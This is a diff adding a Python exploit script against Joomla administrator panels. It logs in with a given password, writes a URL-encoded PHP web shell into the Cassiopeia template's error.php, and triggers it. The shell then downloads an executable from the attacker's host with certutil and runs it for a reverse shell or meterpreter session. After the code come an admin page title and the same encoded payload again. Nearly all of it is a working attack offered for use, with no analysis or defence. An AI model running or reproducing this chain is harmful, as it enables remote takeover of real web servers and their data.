@@ -1,0 +1,128 @@
+import sys, socket, requests
+
+def resolveip(ip):
+    try:
+        socket.gethostbyname(ip)
+        print('[-]Valid IP')
+    except socket.error:
+        print("[-]Enter a valid IP address.")
+        sys.exit()
+
+def authenticate(password, ip):
+    resolveip(ip)
+    url = f'http://{ip}/administrator/index.php'
+    print(f'[-]Authentication URL is ==> {url}')
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
+        'Content-Type': 'application/x-www-form-urlencoded'
+    }
+    data = {
+        'username': 'Administrator',
+        'passwd': password
+    }
+    print(f'[-]Creds used are ==> Administrator:{data["passwd"]}')
+    try:
+        authresponse = requests.post(url=url, headers=headers, data=data)
+        if '770f5c99f1b67a1cc480471651b7d9b3=' not in authresponse.headers.get('Set-Cookie', ''):
+            print(f'[!]Authentication for Administrator and with password: {data.passwd} failed')
+            sys.exit()
+
+        cookie = str(authresponse.headers['Set-Cookie'])
+        print(f'[*]Authentication successful. Your cookie is => {cookie}')
+
+        return cookie
+    except requests.exceptions.HTTPError as http_err:
+            print(f"[!]HTTP error occurred: {http_err}")
+    except requests.exceptions.ConnectionError as conn_err:
+        print(f"[!]Connection error occurred: {conn_err}")
+    except requests.exceptions.Timeout as timeout_err:
+        print(f"[!]Timeout error occurred: {timeout_err}")
+    except requests.exceptions.RequestException as req_err:
+        print(f"[!]An error occurred: {req_err}")
+
+def postpayload(cookie, ip):
+    headers2 = {
+        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'Cookie': cookie
+    }
+
+    data2 = {
+        'isMedia': 0,
+        'jform[source]': '%3C%3Fphp%0D%0A%0D%0Afunction+executeCommand%28%24command%29%7B%0D%0A++++%24output+%3D+shell_exec%28%24command%29%3B%0D%0A++++echo+%22%3Cpre%3EExecuted%3A+%24command%3C%2Fpre%3E%22%3B%0D%0A++++echo+%22%3Cpre%3E%24output%3C%2Fpre%3E%22%3B%0D%0A%7D%0D%0A%0D%0Aif+%28%24_SERVER%5B%27REQUEST_METHOD%27%5D+%3D%3D%3D+%27GET%27%29+%7B%0D%0A++++%24ip+%3D+%24_GET%5B%27ip%27%5D%3B%0D%0A++++%24file+%3D+%24_GET%5B%27file%27%5D%3B%0D%0A++++%24url+%3D+%22http%3A%2F%2F%24ip%2F%24file%22%3B%0D%0A++++echo+%22%3Cpre%3EDownloading+payload+from%3A+%24url%3C%2Fpre%3E%22%3B%0D%0A++++%0D%0A++++%2F%2F+Use+double+quotes+to+correctly+expand+PHP+variables%0D%0A++++%24downloadcmd+%3D+%22certutil+-urlcache+-split+-f+%5C%22%24url%5C%22+%5C%22%24file%5C%22%22%3B%0D%0A++++%2F%2F+Use+the+full+path+to+the+executable+to+avoid+issues%0D%0A++++%24runcmd+%3D+%22cmd+%2Fc+%5C%22%24file%5C%22%22%3B%0D%0A++++%0D%0A++++executeCommand%28%24downloadcmd%29%3B%0D%0A++++executeCommand%28%24runcmd%29%3B++%0D%0A%7D+else+%7B%0D%0A++++echo+%22Use+GET+method%21%21%22%3B%0D%0A%7D%0D%0A%3F%3E%0D%0A',
+        'task': 'template.apply',
+        'jform[extension_id]': 223,
+        'jform[filename]': 'C:\xampp\htdocs\joomla\templates\cassiopeia\error.php',
+        '497ba732495c263222c6f290389f731': 1
+    }
+    url2 = f'http://{ip}/administrator/index.php?option=com_templates&view=template&id=223&file=Ly9lcnJvci5waHA&isMedia=0'
+    print(f'[-]Target URL ==> {url2}')
+    try:
+        response = requests.post(url=url2, headers=headers2, data=data2)
+
+        if 'Downloading payload' not in  response.text:
+            print('[!]Failed to write payload on the template and save successfully')
+            sys.exit()
+        else:
+            print(f'[*]Successfully wrote and saved payload')
+    except requests.exceptions.HTTPError as http_err:
+        print(f"[!]HTTP error occurred: {http_err}")
+    except requests.exceptions.ConnectionError as conn_err:
+        print(f"[!]Connection error occurred: {conn_err}")
+    except requests.exceptions.Timeout as timeout_err:
+        print(f"[!]Timeout error occurred: {timeout_err}")
+    except requests.exceptions.RequestException as req_err:
+        print(f"[!]An error occurred: {req_err}")
+    
+def trigger_reverse_call(ip, file):
+
+    headers3 = { 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' }
+    url3 = f'http://{ip}/templates/cassiopeia/error.php'
+    print('[-]Fetching your reverse_tcp payload and executing it')
+    
+    params = {
+        'ip': ip,
+        'file': file
+    }
+
+    if params:
+        try:
+            response2 = requests.get(url=url3, params=params, headers=headers3)
+            if response2.status_code == 200:
+                print('[*]Successfully triggered the reverse shell sequence.')  
+    
+            print(f'[*]You should have seen get request to fetch {file} logged in your python server and gotten your meterpreter session if things were configured correctly')
+        except requests.exceptions.HTTPError as http_err:
+            print(f"[!]HTTP error occurred: {http_err}")
+        except requests.exceptions.ConnectionError as conn_err:
+            print(f"[!]Connection error occurred: {conn_err}")
+        except requests.exceptions.Timeout as timeout_err:
+            print(f"[!]Timeout error occurred: {timeout_err}")
+        except requests.exceptions.RequestException as req_err:
+            print(f"[!]An error occurred: {req_err}")
+
+def main():
+
+    if len(sys.argv) < 5:
+        print("[-]Usage: python reverse.py <your_ip> <targetip> <payloadfile.exe> <password>")
+        sys.exit()
+
+    yourip = str(sys.argv[1])
+    targetip = str(sys.argv[2])
+    file = str(sys.argv[3])
+    passwd = str(sys.argv[4])
+
+    resolveip(yourip)
+    cookiestring = authenticate(passwd, targetip)
+    postpayload(cookiestring, targetip)
+    trigger_reverse_call(yourip, file)
+
+
+if __name__ == '__main__':
+    main()
+
+
+Templates: Customise (Cassiopeia) - Holography Industries - Administration
+
+%3C%3Fphp%0D%0A%0D%0Afunction+executeCommand%28%24command%29%7B%0D%0A++++%24output+%3D+shell_exec%28%24command%29%3B%0D%0A++++echo+%22%3Cpre%3EExecuted%3A+%24command%3C%2Fpre%3E%22%3B%0D%0A++++echo+%22%3Cpre%3E%24output%3C%2Fpre%3E%22%3B%0D%0A%7D%0D%0A%0D%0Aif+%28%24_SERVER%5B%27REQUEST_METHOD%27%5D+%3D%3D%3D+%27GET%27%29+%7B%0D%0A++++%24ip+%3D+%24_GET%5B%27ip%27%5D%3B%0D%0A++++%24file+%3D+%24_GET%5B%27file%27%5D%3B%0D%0A++++%24url+%3D+%22http%3A%2F%2F%24ip%2F%24file%22%3B%0D%0A++++echo+%22%3Cpre%3EDownloading+payload+from%3A+%24url%3C%2Fpre%3E%22%3B%0D%0A++++%0D%0A++++%2F%2F+Use+double+quotes+to+correctly+expand+PHP+variables%0D%0A++++%24downloadcmd+%3D+%22certutil+-urlcache+-split+-f+%5C%22%24url%5C%22+%5C%22%24file%5C%22%22%3B%0D%0A++++%2F%2F+Use+the+full+path+to+the+executable+to+avoid+issues%0D%0A++++%24runcmd+%3D+%22cmd+%2Fc+%5C%22%24file%5C%22%22%3B%0D%0A++++%0D%0A++++executeCommand%28%24downloadcmd%29%3B%0D%0A++++executeCommand%28%24runcmd%29%3B++%0D%0A%7D+else+%7B%0D%0A++++echo+%22Use+GET+method%21%21%22%3B%0D%0A%7D%0D%0A%3F%3E%0D%0A
+
